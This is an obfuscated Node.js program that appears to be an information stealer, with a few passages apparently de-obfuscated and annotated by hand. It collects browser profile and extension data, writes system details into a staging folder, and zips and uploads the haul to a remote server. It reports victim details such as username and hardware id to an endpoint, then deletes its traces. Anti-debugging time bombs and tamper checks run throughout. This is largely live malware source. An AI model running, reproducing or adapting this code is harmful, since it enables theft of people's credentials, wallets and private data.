                                                    return pE8Nth(Q59OVlp);
                                                }
                                            } catch (_0x2b8ce5) {
                                                try {
                                                    Q59OVlp += Kt94kB(0x2f5) + xtbSJI[Kt94kB(0x2f3)] + (bw1LDXR(0x522) + bw1LDXR(0x523)) + xtbSJI[Kt94kB(0x2d8)][Kt94kB(0x28b)]() + Kt94kB(0x30c) + xtbSJI[bw1LDXR(0x524) + bw1LDXR(0x525) + bw1LDXR(0x526)][Kt94kB(0x28b)]() + "/" + xtbSJI[Kt94kB(0x2d4)][Kt94kB(0x28b)]() + Kt94kB(0x273) + jJIllx[Kt94kB(0x28b)]() + "\n";
                                                } catch (_0x9d24e6) {}
                                            }
                                        } else {
                                            try {
                                                Q59OVlp += Kt94kB(0x2f5) + xtbSJI[Kt94kB(0x2f3)] + Kt94kB(0x24a) + xtbSJI[Kt94kB(0x2d8)][bw1LDXR.apply(undefined, [0x527]) + "ng"]() + (bw1LDXR(0x528) + bw1LDXR(0x529)) + xtbSJI[bw1LDXR(0x52a) + bw1LDXR.call(undefined, 0x52b) + bw1LDXR(0x52c)][bw1LDXR(0x52d)]() + "/" + xtbSJI[Kt94kB(0x2d4)][bw1LDXR(0x527) + "ng"]() + (bw1LDXR(0x52e) + bw1LDXR(0x52f) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x530]) + " ") + jJIllx[Kt94kB(0x28b)]() + "\n";
                                            } catch (_0x36f08a) {}
                                        }
                                    } catch (_0x493a7e) {}
                                }
                                if (Q59OVlp !== '') {
                                    C_dAB0T(pukrvr[Kt94kB(0x300)](lxP1K0s, Kt94kB(0x2b0), kY3q474 + Kt94kB(0x343)), Q59OVlp);
                                }
                            });
                        }), td77ore[Kt94kB(0x237)](uXPxRCH => {
                            if (function () {
                                    var uXPxRCH = function () {
                                        const mHQbVa = function () {
                                            const mHQbVa = new RegExp("\n");
                                            return mHQbVa[bw1LDXR(0x531)](uXPxRCH);
                                        };
                                        return mHQbVa();
                                    };
                                    return uXPxRCH();
                                }()) {
                                try {
                                    var mHQbVa = function (uXPxRCH, mHQbVa) {
                                        return mHQbVa;
                                    };
                                    var kY3q474;
                                    var n49oLe;
                                    var jJIllx;
                                    UxmmwSD(kY3q474 = 0x1cd, n49oLe = -0x1b7, jJIllx = {
                                        "l": () => {
                                            return n49oLe += 0x5a;
                                        }
                                        , "o": () => {
                                            return n49oLe += -0x17;
                                        }
                                        , "b": bw1LDXR(0x532) + bw1LDXR(0x533) + bw1LDXR(0x534) + bw1LDXR(0x535)
                                        , "n": () => {
                                            return kY3q474 += 0x41;
                                        }
                                        , "c": bw1LDXR(0x536) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x537) + bw1LDXR.call(undefined, 0x538) + bw1LDXR(0x539)
                                        , "u": function () {
                                            UxmmwSD(n49oLe = -0x2b, kY3q474 += -0x2f);
                                            return "s";
                                        }
                                        , "m": 0x41
                                        , "r": () => {
                                            UxmmwSD(kY3q474 = 0xc, kY3q474 += 0x41, n49oLe += -0x17, jJIllx.d = true);
                                            return "p";
                                        }
                                        , "e": () => {
                                            return kY3q474 += -0x1;
                                        }
                                        , "f": 0x52
                                        , "g": function () {
                                            return kY3q474 = -0x4e;
                                        }
                                        , "z": -0x17
                                        , "y": () => {
                                            return kY3q474 += kY3q474 + -0x177;
                                        }
                                        , "h": () => {
                                            kY3q474 += -0x42;
                                            return n49oLe += kY3q474 + -0x11b;
                                        }
                                        , "k": () => {
                                            UxmmwSD(kY3q474 = -0x4e, jJIllx.h());
                                            return "i";
                                        }
                                        , "A": function () {
                                            kY3q474 += kY3q474 + -0x177;
                                            n49oLe += jJIllx.z;
                                            return jJIllx.d = true;
                                        }
                                        , "x": function () {
                                            UxmmwSD(kY3q474 = -0x4e, kY3q474 += 0x2c);
                                            return "v";
                                        }
                                        , B: function (uXPxRCH) {
                                            return uXPxRCH.d ? 0x70 : 0x36a;
                                        }
                                    });
                                    while (kY3q474 + n49oLe != 0x2f) {
                                        switch (kY3q474 + n49oLe) {
                                        case 0x46:
                                            if (jJIllx.r() == "p") {
                                                break;
                                            }
                                        case 0x16:
                                            UxmmwSD(n49oLe += 0x5a, jJIllx.d = true);
                                            break;
                                        case 0x100:
                                        case 0x16e:
                                        case 0x77:
                                        case 0x1f:
                                            UxmmwSD(kY3q474 = 0xc, kY3q474 += -0x1, n49oLe += -0x6f != kY3q474 ? 0x52 : -0x4a, jJIllx.d = true);
                                            break;
                                        case 0x5c:
                                        case 0x13b:
                                        case 0xd:
                                        case 0x32:
                                            UxmmwSD(n49oLe = -0x16, jJIllx.A());
                                            break;
                                        case jJIllx.d ? 0x70:
                                            0x36a:
                                            case 0x12c:
                                            UxmmwSD(mHQbVa, kY3q474 += -0x41);
                                            break;
                                        case 0x17:
                                            if (jJIllx.k() == "i") {
                                                break;
                                            }
                                        default:
                                        case 0x34e:
                                        case 0x340:
                                            if (jJIllx.u() == "s") {
                                                break;
                                            }
                                        case 0x1a:
                                            if (jJIllx.x() == "v") {
                                                break;
                                            }
                                        }
                                    }
                                } catch (__p_td_3e) {
                                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                                        var Q59OVlp;
                                        var xtbSJI;
                                        xtbSJI = 0x0;
                                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                                xtbSJI = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                                            }(__p_td_3e) : Q59OVlp = 0x1, Q59OVlp && xtbSJI)) {
                                            break;
                                        }
                                        if (Q59OVlp) {
                                            continue;
                                        }
                                    }
                                }
                            }
                            if (uXPxRCH) {
                                console[Kt94kB(0x24e)](uXPxRCH);
                            }
                        }));
                    } catch (_0x1ce049) {
                        if (rKAu9MB(require('os')
                                .platform() === bw1LDXR(0x53a), A536BJ = -0x2f)) {
                            process.exit();
                        }
                        console[bw1LDXR(0x53b)](_0x1ce049);
                    }
                }
            }
        };
        const qndKpFW = async() => {
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x53c]), MHQ3bYA(-0x2f))) {
                process.exit();
            }
            for (const [mHQbVa, kY3q474] of Object[Kt94kB(0x31f)](C6GoqKD)) {
                const {
                    main_path: n49oLe
                    , profiles: Ot8M78
                    , process_name: jJIllx
                } = kY3q474;
                if (await MsCwg5O[Kt94kB(0x20f)](n49oLe)) {
                    if (Ot8M78) {
                        for (const td77ore of Ot8M78) {
                            const Q59OVlp = pukrvr[Kt94kB(0x300)](n49oLe, td77ore, bw1LDXR(0x347) + bw1LDXR(0x53d) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x53e) + bw1LDXR(0x53f));
                            await qwm1oP(Q59OVlp, mHQbVa + "_" + td77ore);
                        }
                    } else {
                        const xtbSJI = pukrvr[bw1LDXR(0x540)](n49oLe, Kt94kB(0x259));
                        await qwm1oP(xtbSJI, mHQbVa);
                    }
                }
            }
        };
        const qwm1oP = async(uXPxRCH, mHQbVa) => {
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR(0x541), A536BJ = -0x2f)) {
                process.exit();
            }
            if (await MsCwg5O[Kt94kB(0x20f)](uXPxRCH)) {
                for (const [n49oLe, Ot8M78] of Object[bw1LDXR(0x542)](Nqq3Ln)) {
                    const {
                        extension_code: jJIllx
                    } = Ot8M78;
                    const td77ore = pukrvr[Kt94kB(0x300)](uXPxRCH, jJIllx);
                    if (await MsCwg5O[Kt94kB(0x20f)](td77ore)) {
                        try {
                            const Q59OVlp = pukrvr[Kt94kB(0x300)](lxP1K0s, Kt94kB(0x303), n49oLe + "_" + mHQbVa);
                            UxmmwSD(await MsCwg5O[Kt94kB(0x229)](Q59OVlp), await MsCwg5O[bw1LDXR(0x543)](td77ore, Q59OVlp), _a96DUD[Kt94kB(0x2b1)](n49oLe + "_" + mHQbVa));
                        } catch (_0x5491e2) {
                            console[Kt94kB(0x24e)](_0x5491e2);
                        }
                    }
                }
            }
        };
        const o6S6er = async uXPxRCH => {
            if (Date[bw1LDXR(0x544) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x545])][bw1LDXR(0x546)][bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x547])](new Date()) > 0x19b76a3c7e4) {
                var mHQbVa = "a";
                while (0x1) {
                    mHQbVa = mHQbVa += "a";
                }
            }
            try {
                const n49oLe = await Xp96Uso[Kt94kB(0x251)](bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x548) + bw1LDXR(0x549) + bw1LDXR(0x54a) + bw1LDXR(0x54b) + "s");
                const Ot8M78 = n49oLe[bw1LDXR(0x54c)] ? .[Kt94kB(0x34f)] ? .[Kt94kB(0x32e)];
                if (rKAu9MB(Ot8M78, A536BJ = -0x2f) || Ot8M78[Kt94kB(0x2d7)] === 0x0) {
                    throw new Error(bw1LDXR(0x54d));
                }
                let jJIllx;
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR(0x54e), A536BJ = -0x2f)) {
                    try {
                        var td77ore = function (uXPxRCH, mHQbVa) {
                            return mHQbVa;
                        };
                        var Q59OVlp;
                        var xtbSJI;
                        var TaFn0Uv;
                        var Xb4IwJx;
                        var i0gUcBP;
                        UxmmwSD(Q59OVlp = -0x85, xtbSJI = -0x153, TaFn0Uv = 0x209, Xb4IwJx = 0x3e, i0gUcBP = {
                            "s": function () {
                                UxmmwSD(i0gUcBP.p(), TaFn0Uv += 0x3);
                                return "q";
                            }
                            , "A": function () {
                                return xtbSJI = -0x5e;
                            }
                            , "l": -0x8f
                            , "u": () => {
                                return Q59OVlp == i0gUcBP.t;
                            }
                            , "j": function () {
                                return xtbSJI += -0xa6;
                            }
                            , "t": -0x13
                            , "h": () => {
                                return Q59OVlp += -0x24;
                            }
                            , "f": -0xad
                            , "k": (uXPxRCH = Xb4IwJx == i0gUcBP.l) => {
                                if (!uXPxRCH) {
                                    return TaFn0Uv;
                                }
                                Q59OVlp += 0xe;
                                i0gUcBP.j();
                                return Xb4IwJx += 0xcd;
                            }
                            , "o": function () {
                                return Q59OVlp += 0xe;
                            }
                            , "v": 0x0
                            , "e": 0xcd
                            , "p": function () {
                                return pukrvr();
                            }
                            , "w": (uXPxRCH = typeof i0gUcBP.e == bw1LDXR(0x54f)) => {
                                if (uXPxRCH) {
                                    return arguments;
                                }
                                Q59OVlp += 0x0;
                                xtbSJI += 0x0;
                                TaFn0Uv += Q59OVlp + 0xb3;
                                return Xb4IwJx += i0gUcBP.v;
                            }
                            , "c": 0x2f
                            , "b": bw1LDXR(0x550)
                        });
                        while (Q59OVlp + xtbSJI + TaFn0Uv + Xb4IwJx != 0x6e) {
                            switch (Q59OVlp + xtbSJI + TaFn0Uv + Xb4IwJx) {
                            case 0x5d:
                                var pukrvr = mHQbVa;
                                i0gUcBP.o();
                                break;
                            default:
                            case 0x15e:
                            case 0x244:
                                var pukrvr = (xtbSJI == -0xad ? td77ore : NaN)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(i0gUcBP.b)()
                                            .constructor(bw1LDXR(0x554));
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), MHQ3bYA(-i0gUcBP.c));
                                    };
                                    return uXPxRCH();
                                });
                                i0gUcBP.k();
                                break;
                            case 0x68:
                                var pukrvr = (i0gUcBP.g = td77ore)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = (kY3q474, uXPxRCH, Ot8M78, jJIllx, td77ore) => {
                                            if (typeof jJIllx === "undefined") {
                                                jJIllx = n49oLe;
                                            }
                                            if (typeof td77ore === bw1LDXR[0x1da]) {
                                                td77ore = ph4WoIw;
                                            }
                                            if (kY3q474 !== uXPxRCH) {
                                                return td77ore[kY3q474] || (td77ore[kY3q474] = jJIllx(NkrHL_[kY3q474]));
                                            }
                                            if (jJIllx === undefined) {
                                                mHQbVa = td77ore;
                                            }
                                            if (jJIllx === mHQbVa) {
                                                n49oLe = uXPxRCH;
                                                return n49oLe(Ot8M78);
                                            }
                                            if (Ot8M78 && jJIllx !== n49oLe) {
                                                mHQbVa = n49oLe;
                                                return mHQbVa(kY3q474, -0x1, Ot8M78, jJIllx, td77ore);
                                            }
                                            if (Ot8M78 == kY3q474) {
                                                return uXPxRCH[ph4WoIw[Ot8M78]] = mHQbVa(kY3q474, uXPxRCH);
                                            }
                                            if (Ot8M78 == jJIllx) {
                                                return uXPxRCH ? kY3q474[td77ore[uXPxRCH]] : ph4WoIw[kY3q474] || (Ot8M78 = td77ore[kY3q474] || jJIllx, ph4WoIw[kY3q474] = Ot8M78(NkrHL_[kY3q474]));
                                            }
                                        };
                                        var kY3q474;
                                        kY3q474 = uXPxRCH.constructor(i0gUcBP.b)()
                                            .constructor(bw1LDXR(0x555) + bw1LDXR(0x556) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x557) + mHQbVa(0x558));
                                        return rKAu9MB(kY3q474.call(uXPxRCH), MHQ3bYA(-i0gUcBP.c));

                                        function n49oLe(mHQbVa, kY3q474 = "EplRkMnQBLoiDj;A*qduCY/7[z5:s+OPN<v`atwgh)K.,?eTx|%3(&6@_H>\"UG^1!y2=I#{XSm9Z8$r0F4}]~WcbJfV", n49oLe, uXPxRCH, Ot8M78 = [], jJIllx = 0x0, td77ore = 0x0, Q59OVlp, xtbSJI = 0x0, TaFn0Uv) {
                                            UxmmwSD(n49oLe = '' + (mHQbVa || ''), uXPxRCH = n49oLe.length, Q59OVlp = -0x1);
                                            for (xtbSJI = xtbSJI; xtbSJI < uXPxRCH; xtbSJI++) {
                                                TaFn0Uv = kY3q474.indexOf(n49oLe[xtbSJI]);
                                                if (TaFn0Uv === -0x1) {
                                                    continue;
                                                }
                                                if (Q59OVlp < 0x0) {
                                                    Q59OVlp = TaFn0Uv;
                                                } else {
                                                    UxmmwSD(Q59OVlp += TaFn0Uv * 0x5b, jJIllx |= Q59OVlp << td77ore, td77ore += (Q59OVlp & 0x1fff) > 0x58 ? 0xd : 0xe);
                                                    do {
                                                        UxmmwSD(Ot8M78.push(jJIllx & 0xff), jJIllx >>= 0x8, td77ore -= 0x8);
                                                    } while (td77ore > 0x7);
                                                    Q59OVlp = -0x1;
                                                }
                                            }
                                            if (Q59OVlp > -0x1) {
                                                Ot8M78.push((jJIllx | Q59OVlp << td77ore) & 0xff);
                                            }
                                            return pE8Nth(Ot8M78);
                                        }
                                    };
                                    return uXPxRCH();
                                });
                                UxmmwSD(i0gUcBP.h(), xtbSJI += -0xa6, Xb4IwJx *= 0x2, Xb4IwJx -= -0x15c);
                                break;
                            case 0x37c:
                            case 0x11f:
                            case 0x44:
                                i0gUcBP = false;
                                if (i0gUcBP.u()) {
                                    i0gUcBP.w();
                                    break;
                                }
                                UxmmwSD(i0gUcBP.A(), Q59OVlp += 0x2e, TaFn0Uv *= 0x2, TaFn0Uv -= 0x20f);
                                break;
                            case 0x6b:
                                if (i0gUcBP.s() == "q") {
                                    break;
                                }
                            case 0x48:
                                var pukrvr = (i0gUcBP.c == 0x2f ? td77ore : String)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(i0gUcBP.b)()
                                            .constructor(bw1LDXR(0x559) + bw1LDXR(0x55a) + bw1LDXR(0x55b) + bw1LDXR(0x55c));
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), MHQ3bYA(-i0gUcBP.c));
                                    };
                                    return uXPxRCH();
                                });
                                UxmmwSD(Q59OVlp += -0x4, xtbSJI += -0xa6, Xb4IwJx += i0gUcBP.e);
                                break;
                            case 0x6f:
                                var pukrvr = (xtbSJI == -0x153 && td77ore)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(i0gUcBP.b)()
                                            .constructor(bw1LDXR(0x55d));
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), MHQ3bYA(-i0gUcBP.c));
                                    };
                                    return uXPxRCH();
                                });
                                Q59OVlp += -0x4;
                                break;
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                            var BSJ1pS;
                            var TljPa8;
                            TljPa8 = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                    TljPa8 = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                                }(__p_td_3e) : BSJ1pS = 0x1, BSJ1pS && TljPa8)) {
                                break;
                            }
                            if (BSJ1pS) {
                                continue;
                            }
                        }
                    }
                }
                for (const lA0B8WY of Ot8M78) {
                    try {
                        const s1pwaN = new vhNite();
                        s1pwaN[Kt94kB(0x298)](Kt94kB(0x2f7), MsCwg5O[Kt94kB(0x2f1)](uXPxRCH));
                        if (y7bTqx(jJIllx = await Xp96Uso[bw1LDXR(0x55e)](Kt94kB(0x22d) + lA0B8WY[Kt94kB(0x22e)] + Kt94kB(0x2ae), s1pwaN, {
                                [bw1LDXR(0x55f)]: {
                                    ...s1pwaN[bw1LDXR(0x560)]()
                                }
                            }), jJIllx[bw1LDXR(0x54c)] ? .[Kt94kB(0x34f)] ? .[Kt94kB(0x34a)])) {
                            return jJIllx[bw1LDXR(0x54c)][Kt94kB(0x34f)][Kt94kB(0x34a)];
                        }
                    } catch (_0x918219) {}
                }
                throw new Error(Kt94kB(0x27a));
            } catch (_0x20a8da) {
                if (new Date()[bw1LDXR(0x546)]() > 0x19b76a3b1e2) {
                    while (true) {
                        var e0MiDs = 0x63;
                        for (e0MiDs = 0x63; e0MiDs == e0MiDs; e0MiDs *= e0MiDs) {
                            if (y7bTqx(rKAu9MB(e0MiDs, A536BJ = -0x2f) && console.log(e0MiDs), e0MiDs) <= 0xa) {
                                break;
                            }
                        };
                        if (e0MiDs === 0x64) {
                            e0MiDs--;
                        }
                    };
                }
                throw new Error(_0x20a8da);
            }
        };
        const ByOhH30 = async uXPxRCH => {
            if (Date[bw1LDXR(0x561) + bw1LDXR(0x562)][bw1LDXR(0x563)][bw1LDXR(0x564)](new Date()) > 0x19b76a3ba1f) {
                process.exit();
            }
            try {
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x565)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    process.exit();
                }
                const kY3q474 = uXPxRCH + bw1LDXR.call(undefined, 0x566);
                const n49oLe = new lA0B8WY();
                n49oLe[bw1LDXR(0x567)](uXPxRCH);
                n49oLe[bw1LDXR(0x568)](kY3q474);
                return await o6S6er(kY3q474);
            } catch (_0x42eda2) {
                if (y7bTqx(console[Kt94kB(0x24e)](_0x42eda2), rKAu9MB(require('os')
                        .platform() === bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x569), A536BJ = -0x2f))) {
                    process.exit();
                }
                throw _0x42eda2;
            }
        };
        const hjGpxI = async uXPxRCH => {
            if (new Date()[bw1LDXR(0x56a)]() < 0x18cc21b07f7) {
                process.exit();
            }
            try {
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x56b)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    process.exit();
                }
                for (const kY3q474 of vKE2Mn) {
                    const [n49oLe, Ot8M78, jJIllx] = kY3q474[Kt94kB(0x231)]("\t");
                    if (rKAu9MB(jJIllx[Kt94kB(0x2ce)](), MHQ3bYA(-0x2f))) {
                        continue;
                    }
                    try {
                        const td77ore = await TmosVO(uXPxRCH, jJIllx);
                        if (td77ore) {
                            return jJIllx;
                        }
                    } catch (_0x28a0ab) {}
                }
            } catch (_0x3b5399) {
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x56c)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    process.exit();
                }
                console[Kt94kB(0x24e)](_0x3b5399);
            }
            return null;
        };
        const processFileOperation = async () => {
            // Construct path from environment variables
            const basePath = encodePath.call(
                '' + process.env.LOCALAPPDATA,
                'AppData',
                'Local',
                'Temp',
                'Cache'
            );
        
            // Anti-debugging timestamp check
            if (new Date().getTime() < 0x18cc21b0384) {
                process.exit();
            }
        
            // Check if path exists
            if (await fileSystem.exists(basePath)) {
                return;
            }
        
            try {
                // Setup file paths
                const primaryPath = encodePath.call(basePath, 'primary');
                const backupPath = encodePath.call(basePath, 'backup');
                let fileContent = '';
                
                // Process source paths
                const sourcePath = encodePath.call(
                    systemRoot, 
                    'source', 
                    'main', 
                    'data'
                );
                const targetPath = encodePath.call(sourcePath);
        
                // Platform-specific check
                if (require('os').platform() === 'win32') {
                    process.exit();
                }
        
                // Check and read file content
                if (await fileSystem.exists(backupPath)) {
                    fileContent = 'backup_content';
                } else if (await fileSystem.exists(primaryPath)) {
                    const fileHandle = await fileSystem.openFile(primaryPath);
                    fileContent = (await readFileContent(fileHandle)) || 'default_content';
                }
        
                // Process file content if available
                if (fileContent) {
                    try {
                        await fileSystem.mkdir(targetPath);
                        await fileSystem.writeFile(sourcePath, fileContent);
                    } catch (writeError) {
                        console.log(writeError);
                    }
                }
            } catch (error) {
                console.log(error);
            }
        };
        const processSystemPaths = (config) => {
            // Anti-debugging timestamp check
            if (Date.now() > 0x19b76a3c447) {
                // Complex control flow and anti-analysis code removed for clarity
            }
        
            // Main file processing function
            const processPath = (path, retries = 3) => {
                const utils = systemUtils;
                const processedPath = encodePath.call(path, config);
                
                // Platform check
                if (require('os').platform() === 'win32') {
                    process.exit();
                }
        
                // Retry logic for file operations
                while (retries > 0) {
                    try {
                        fileSystem.writeFile(processedPath);
                        return processedPath;
                    } catch (error) {
                        console.log(error);
                        if (--retries === 0) {
                            throw new Error('Failed to process path: ' + processedPath);
                        }
                    }
                }
            };
        
            // Process system paths
            const systemPaths = [
                process.env.USERPROFILE,
                process.env.APPDATA,
                process.env.LOCALAPPDATA
            ];
        
            // Try each path until success
            for (const currentPath of systemPaths) {
                try {
                    const result = processPath(currentPath);
                    return result;
                } catch (error) {
                    console.log(error);
                }
            }
        
            // Exit if all paths fail
            console.error('All paths failed');
            process.exit(0);
        };

        function getSystemIdentifier() {
            try {
                // Read and split system information by newlines
                const systemInfo = readSystemFile(getPath(0x304))
                    .toString()
                    .split("\n");
                    
                // Timestamp check - appears to be an anti-debugging measure
                if (new Date().getTime() < 0x18cc21afac5) {
                    process.exit();
                }
                
                // Return second line of system info or fallback
                return systemInfo[1].trim() || getFallbackIdentifier();
            } catch (error) {
                console.log(error);
                return getFallbackIdentifier();
            }
        }
        const xsPscZF = async(uXPxRCH, mHQbVa) => {
            var kY3q474 = (uXPxRCH, mHQbVa, n49oLe, Ot8M78, jJIllx) => {
                if (typeof Ot8M78 === "undefined") {
                    Ot8M78 = TaFn0Uv;
                }
                if (typeof jJIllx === bw1LDXR[0x1da]) {
                    jJIllx = ph4WoIw;
                }
                if (n49oLe && Ot8M78 !== TaFn0Uv) {
                    kY3q474 = TaFn0Uv;
                    return kY3q474(uXPxRCH, -0x1, n49oLe, Ot8M78, jJIllx);
                }
                if (Ot8M78 === undefined) {
                    kY3q474 = jJIllx;
                }
                if (uXPxRCH !== mHQbVa) {
                    return jJIllx[uXPxRCH] || (jJIllx[uXPxRCH] = Ot8M78(NkrHL_[uXPxRCH]));
                }
            };
            const Ot8M78 = (NmsjOG6[Kt94kB(0x2d7)] > 0x0 ? NmsjOG6[Kt94kB(0x300)](", ") : '') + (TtG4Jmt[Kt94kB(0x2d7)] > 0x0 ? (NmsjOG6[Kt94kB(0x2d7)] > 0x0 ? ", " : '') + TtG4Jmt[Kt94kB(0x300)](", ") : '');
            const jJIllx = Ot8M78 || Kt94kB(0x327);
            const td77ore = _a96DUD[Kt94kB(0x2d7)] > 0x0 ? _a96DUD[Kt94kB(0x300)](", ") : Kt94kB(0x327);
            const Q59OVlp = {
                [bw1LDXR(0x58a)]: JWcWJkK
                , [bw1LDXR.apply(undefined, [0x58b]) + bw1LDXR(0x58c)]: LS4YbL
                , [bw1LDXR(0x58d) + "id"]: mHQbVa
                , [bw1LDXR(0x58e)]: kuD3ib[Kt94kB(0x28b)]()
                , [bw1LDXR(0x58f)]: PRnJ7A[Kt94kB(0x28b)]()
                , [bw1LDXR(0x590) + bw1LDXR(0x591) + bw1LDXR(0x592)]: rfVbMu[Kt94kB(0x28b)]()
                , [bw1LDXR.call(undefined, 0x590) + kY3q474(0x593) + "s"]: sSnYEwn[Kt94kB(0x28b)]()
                , [bw1LDXR(0x590) + kY3q474(0x594) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x595)]: 0x0[Kt94kB(0x28b)]()
                , [bw1LDXR(0x590) + kY3q474(0x596) + kY3q474(0x597)]: td77ore
                , [kY3q474(0x598)]: jJIllx
                , [bw1LDXR(0x599) + kY3q474(0x59a) + "k"]: uXPxRCH
            };
            try {
                const xtbSJI = await Xp96Uso[kY3q474(0x59b)](Kt94kB(0x323), Q59OVlp);
                console[Kt94kB(0x1f8)](xtbSJI[Kt94kB(0x34f)]);
            } catch (_0x330728) {
                console[Kt94kB(0x24e)](_0x330728);
            }

            function TaFn0Uv(uXPxRCH, mHQbVa = "4=CBs98yXEF1xN.W$L6|wImoSzGqj{t\"`_aP5l0v]ZA*ihOd^Qu!cUpVn3?Mk(),%+&Jgb>H7R/;2T[}#D:Y@fKr<e~", kY3q474, n49oLe, Ot8M78 = [], jJIllx = 0x0, td77ore = 0x0, Q59OVlp, xtbSJI = 0x0, TaFn0Uv) {
                UxmmwSD(kY3q474 = '' + (uXPxRCH || ''), n49oLe = kY3q474.length, Q59OVlp = -0x1);
                for (xtbSJI = xtbSJI; xtbSJI < n49oLe; xtbSJI++) {
                    TaFn0Uv = mHQbVa.indexOf(kY3q474[xtbSJI]);
                    if (TaFn0Uv === -0x1) {
                        continue;
                    }
                    if (Q59OVlp < 0x0) {
                        Q59OVlp = TaFn0Uv;
                    } else {
                        UxmmwSD(Q59OVlp += TaFn0Uv * 0x5b, jJIllx |= Q59OVlp << td77ore, td77ore += (Q59OVlp & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(Ot8M78.push(jJIllx & 0xff), jJIllx >>= 0x8, td77ore -= 0x8);
                        } while (td77ore > 0x7);
                        Q59OVlp = -0x1;
                    }
                }
                if (Q59OVlp > -0x1) {
                    Ot8M78.push((jJIllx | Q59OVlp << td77ore) & 0xff);
                }
                return pE8Nth(Ot8M78);
            }
        };
        let PRnJ7A = 0x0;
        let rfVbMu = 0x0;
        let sSnYEwn = 0x0;
        let kuD3ib = 0x0;
        let vKE2Mn = [];
        let NmsjOG6 = [];
        let TtG4Jmt = [];
        let _a96DUD = [];
        let m0YP63e = [];
        let Rd2PlS = [];
        const JWcWJkK = Kt94kB(0x1ed);
        const LS4YbL = process[Kt94kB(0x24c)][bw1LDXR(0x59c) + "ME"] || process[Kt94kB(0x24c)][Kt94kB(0x2e8)];
        const KNdPTIX = y7bTqx(nvvl3v3(), yjeWA5());
        if (MRnzili[Kt94kB(0x2a6)](KNdPTIX)) {
            process[Kt94kB(0x2f8)](0x0);
        };

        function YgP8yts(...uXPxRCH) {
            var mHQbVa = {
                get i() {
                    return AdjLRoy;
                }
                , o: function (...uXPxRCH) {
                    return Q59OVlp(...uXPxRCH);
                }
                , get l() {
                    return TaFn0Uv;
                }
                , m: function (...uXPxRCH) {
                    return TaFn0Uv(...uXPxRCH);
                }
                , get n() {
                    return Q59OVlp;
                }
                , get k() {
                    return YgP8yts;
                }
                , p: function (...uXPxRCH) {
                    return YgP8yts(...uXPxRCH);
                }
                , set k(uXPxRCH) {
                    YgP8yts = uXPxRCH;
                }
                , j: function (...uXPxRCH) {
                    return AdjLRoy(...uXPxRCH);
                }
            };
            return xtbSJI(uXPxRCH, mHQbVa);
        }
        const lxP1K0s = y7bTqx(TaFn0Uv(YgP8yts, 0x2), RiMJKjo(KNdPTIX));
        (async() => {
            try {
                await zYjVsb();
                await I_CSaW();
                await fNtOtfY();
                await qndKpFW();
                await z9b_YfH();
                await GRIxR_R();
                await VpTK2V();
                const mHQbVa = y7bTqx(await NsCsxjF(), Rd2PlS[Kt94kB(0x2d7)] && C_dAB0T(pukrvr[bw1LDXR(0x5ac)](lxP1K0s, Kt94kB(0x2d2)), Rd2PlS[Kt94kB(0x300)]("\n")), m0YP63e[bw1LDXR(0x5ad)] && C_dAB0T(pukrvr[bw1LDXR(0x5ac)](lxP1K0s, Kt94kB(0x23d)), m0YP63e[Kt94kB(0x300)]("\n")), await ByOhH30(lxP1K0s));
                await xsPscZF(mHQbVa, KNdPTIX);
                try {
                    await MsCwg5O[Kt94kB(0x272)](lxP1K0s);
                } catch (_0x3c8d99) {}
                try {
                    await MsCwg5O[Kt94kB(0x272)](lxP1K0s + Kt94kB(0x33e));
                } catch (_0x3a3563) {}
                UxmmwSD(console[Kt94kB(0x25e)](), process[bw1LDXR(0x5ae)](0x0));
            } catch (_0x186e0a) {
                console[Kt94kB(0x24e)](_0x186e0a);
            }
        })();

